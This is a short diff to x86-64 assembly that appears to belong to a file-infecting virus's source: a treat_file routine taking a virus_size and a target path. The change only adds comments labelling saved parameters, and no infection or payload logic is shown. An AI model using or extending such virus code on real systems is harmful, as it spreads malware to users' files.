@@ -51,10 +51,10 @@ _treat_file: ; void treat_file(char *name (rdi), long virus_size (rsi), char *fu
 	cmp rdi, 0
 	je _not_ok_end
 ; save parameters
-	mov QWORD [rsp + 112], r10
-	mov QWORD [rsp + 8], rsi
-	mov QWORD [rsp + 64], rdi
-	mov QWORD [rsp + 72], rdx
+	mov QWORD [rsp + 112], r10 ; fork bool
+	mov QWORD [rsp + 8], rsi ; virus_size
+	mov QWORD [rsp + 64], rdi ; name
+	mov QWORD [rsp + 72], rdx ; full_path
 
 ; take len of arguments
 	mov rdi, QWORD [rsp + 64]
